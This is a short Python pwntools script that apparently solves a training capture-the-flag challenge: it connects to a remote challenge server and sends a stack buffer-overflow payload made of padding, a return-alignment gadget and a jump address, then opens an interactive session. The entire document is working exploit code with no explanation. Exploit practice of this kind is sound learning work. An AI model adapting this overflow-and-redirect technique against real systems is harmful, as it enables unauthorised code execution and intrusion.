from pwn import *

# r=process('./pwn1')
r=remote("train2024.hitctf.cn",26505)

context.arch="amd64"# x64
context.terminal=["tmux","splitw","-h"]

# gdb.attach(r)

playload=b'a'*(0xf+8)+p64(0x40101a)+p64(0x0401196)
r.sendlineafter(b"please input",playload)

r.interactive()